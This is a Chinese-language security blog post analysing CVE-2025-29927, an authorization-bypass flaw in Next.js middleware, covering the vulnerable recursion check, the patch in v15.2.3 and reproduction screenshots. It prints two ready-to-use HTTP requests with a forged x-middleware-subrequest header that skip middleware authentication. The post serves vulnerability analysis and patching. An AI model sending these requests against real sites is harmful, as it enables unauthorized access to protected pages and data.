
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/CVE-Lemon/p/18797265" title="发布于 2025-03-28 09:16">
    <span role="heading" aria-level="2">Next.js中间件权限绕过漏洞分析（CVE-2025-29927）</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>本文代码版本为next.js-15.2.2</p>
<p>本篇文章首发在先知社区：<a href="https://xz.aliyun.com/news/17403" target="_blank" rel="noopener nofollow">https://xz.aliyun.com/news/17403</a></p>
<h2 id="一漏洞概述">一、漏洞概述</h2>
<p><strong>CVE-2025-29927</strong>是Next.js框架中存在的一个高危中间件逻辑绕过漏洞，允许攻击者通过构造特定HTTP请求头，绕过中间件的安全控制逻辑（如身份验证、路径重写、CSP防护等）。该漏洞CVSS评分<strong>9.1（Critical）</strong>，可导致未授权访问、数据泄露及拒绝服务攻击。</p>
<h2 id="二漏洞分析">二、漏洞分析</h2>
<h3 id="1-漏洞背景">1. 漏洞背景</h3>
<p>Next.js中间件（Middleware）允许开发者在请求到达目标路由前执行代码，典型应用场景包括：</p>
<ul>
<li><strong>身份验证</strong>：检查用户会话Cookie，拦截未授权请求。</li>
<li><strong>路径重写</strong>：动态修改请求路径（如多语言路由<code>/en/home</code> → <code>/home</code>）。</li>
<li><strong>安全头设置</strong>：添加CSP、CORS等安全响应头。</li>
</ul>
<p>中间件的安全性直接决定了应用的核心防护能力。若中间件逻辑被绕过，攻击者可直接访问后端业务逻辑。</p>
<h3 id="2-漏洞核心机制">2. 漏洞核心机制</h3>
<p>用户发出请求在middleware中会请求身份验证接口，而请求身份验证接口也会经过middleware，所以为了解决请求身份验证接口这种逻辑，Next.js通过<code>x-middleware-subrequest</code>头标识内部递归请求。</p>
<p>每次递归请求都会向该头添加一次<code>middleware</code>，如果递归请求达到五次，就会返回一个带有 <code>'x-middleware-next': '1'</code> 的响应，表示忽略中间件的所有逻辑（包括鉴权检查）。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091414445-2135742610.png" alt="image" loading="lazy"></p>
<center>packages\next\src\server\web\sandbox\sandbox.ts</center>
<h3 id="3-关键代码">3. 关键代码</h3>
<p>简化代码：</p>
<ul>
<li><strong><code>params.name</code></strong>：中间件路径标识（如 <code>src/middleware</code> 或 <code>middleware</code>）。</li>
<li><strong><code>subrequests</code></strong>：<code>x-middleware-subrequest</code> 头按 <code>:</code> 分割后的数组。</li>
<li><strong><code>depth</code></strong>：统计 <code>subrequests</code> 中与 <code>params.name</code> 匹配的次数。</li>
</ul>
<pre><code class="language-typescript">const subreq = params.request.headers[`x-middleware-subrequest`]
const subrequests = subreq.split(':') : []
const MAX_RECURSION_DEPTH = 5
const depth = subrequests.reduce(
    (acc, curr) =&gt; (curr === params.name ? acc + 1 : acc),
    0
)

if (depth &gt;= MAX_RECURSION_DEPTH) {
  return {
    response: new runtime.context.Response(null, {
      headers: {'x-middleware-next': '1',},}),}
  }
</code></pre>
<p><strong>漏洞成因</strong>：</p>
<ul>
<li><strong>路径暴露</strong>：中间件的逻辑路径（<code>middlewareInfo.name</code>）可被攻击者推测。</li>
<li><strong>校验宽松</strong>：未对<strong>外部请求</strong>的<code>x-middleware-subrequest</code>头进行过滤，允许伪造内部请求标识。</li>
</ul>
<h3 id="4-payload-构造">4. Payload 构造</h3>
<p><strong>确定中间件路径标识</strong></p>
<p><code>params.name</code> 是中间件模块在 Next.js 构建过程中生成的逻辑路径标识，其值由<code>.next/server/middleware-build-manifest.json</code>文件决定。</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091425865-196542565.png" alt="image" loading="lazy"></p>
<p><strong>构造绕过请求头</strong></p>
<p><code>middleware.ts</code>在根目录 → <code>middleware</code></p>
<pre><code class="language-http">GET /dashboard HTTP/1.1
Host: localdomain:3000
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

</code></pre>
<p><code>middleware.ts</code>在 <code>src</code> 目录 → <code>src/middleware</code></p>
<pre><code class="language-http">GET /dashboard HTTP/1.1
Host: localdomain:3000
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware

</code></pre>
<h2 id="三漏洞复现">三、漏洞复现</h2>
<p>环境地址：<a href="https://github.com/lem0n817/CVE-2025-29927" target="_blank" rel="noopener nofollow">lem0n817/CVE-2025-29927 (github.com)</a></p>
<h3 id="middleware">middleware</h3>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091435020-1494116777.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091438921-196550742.png" alt="image" loading="lazy"></p>
<h3 id="srcmiddleware">src/middleware</h3>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091442054-576198945.png" alt="image" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091446266-175660105.png" alt="image" loading="lazy"></p>
<h2 id="四漏洞修复">四、漏洞修复</h2>
<p><a href="https://github.com/vercel/next.js/compare/v15.2.2...v15.2.3" target="_blank" rel="noopener nofollow">Comparing v15.2.2...v15.2.3 · vercel/next.js (github.com)</a></p>
<p>这里是对多处进行了修改，挑选最关键的一处进行分析：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250328091448939-565732011.png" alt="image" loading="lazy"></p>
<p>通过动态令牌验证（<code>x-middleware-subrequest-id</code>）和加密符号存储（<code>Symbol.for</code>）严格区分内外请求，非法伪造的<code>x-middleware-subrequest</code>头会被自动删除，确保中间件安全逻辑不被绕过。</p>
<pre><code class="language-typescript">// If this request didn't origin from this session we filter
// out the "x-middleware-subrequest" header so we don't skip
// middleware incorrectly
if (
  header === 'x-middleware-subrequest' &amp;&amp;
  headers['x-middleware-subrequest-id'] !==
    (globalThis as any)[Symbol.for('@next/middleware-subrequest-id')]
) {
  delete headers['x-middleware-subrequest']
}
</code></pre>
<h2 id="五参考">五、参考</h2>
<p><a href="https://wx.zsxq.com/group/2212251881/topic/1524224154842282" target="_blank" rel="noopener nofollow">代码审计-知识星球 (zsxq.com)</a></p>
<p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware" target="_blank" rel="noopener nofollow">Next.js 和损坏的中间件：授权工件 - zhero_web_security</a></p>
<p><a href="https://www.ch35tnut.com/zh-cn/vulnerability/cve-2025-29927-nextjs-auth-bypass/" target="_blank" rel="noopener nofollow">CVE 2025 29927 Nextjs Auth Bypass - chestnut's blog</a></p>
<hr>
<p>本文作者CVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
先知社区：<a href="https://xz.aliyun.com/users/136909" target="_blank" rel="noopener nofollow">https://xz.aliyun.com/users/136909</a><br>
微信公众号：Lemon安全</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.3789281556550926" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-28 09:16">2025-03-28 09:16</span>&nbsp;
<a href="https://www.cnblogs.com/CVE-Lemon">CVE-柠檬i</a>&nbsp;
阅读(<span id="post_view_count">43</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18797265" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18797265);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18797265', targetLink: 'https://www.cnblogs.com/CVE-Lemon/p/18797265', title: 'Next.js中间件权限绕过漏洞分析（CVE-2025-29927）' })">举报</a>
</div>
        